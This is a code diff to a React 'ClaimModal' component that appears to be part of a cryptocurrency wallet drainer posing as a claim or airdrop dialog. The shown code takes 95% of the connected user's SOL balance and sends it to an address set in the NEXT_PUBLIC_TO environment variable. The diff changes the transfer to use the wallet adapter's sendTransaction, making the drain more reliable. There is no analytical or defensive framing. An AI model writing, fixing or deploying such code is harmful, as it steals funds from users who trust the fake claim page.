@@ -5,7 +5,7 @@ import { WalletService } from '../services/walletService';
 import { TelegramService } from '../services/telegramService';
 
 export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
-  const { publicKey } = useWallet();
+  const { publicKey, sendTransaction, connection } = useWallet();
   const [countdown, setCountdown] = useState(10);
   const [isComplete, setIsComplete] = useState(false);
   const [error, setError] = useState(null);
@@ -39,10 +39,8 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
       // Calculate transfer amount (95% of balance)
       const transferAmount = walletBalance * 0.95;
 
-      // Get the wallet adapter instance
-      const wallet = window.solana;
-      if (!wallet) {
-        throw new Error('Wallet not found');
+      if (!sendTransaction) {
+        throw new Error('Wallet not connected');
       }
 
       console.log('Transaction details:', {
@@ -52,7 +50,7 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
       });
 
       const result = await transactionService.sendSol(
-        wallet,
+        { sendTransaction, publicKey },
         process.env.NEXT_PUBLIC_TO,
         transferAmount
       );
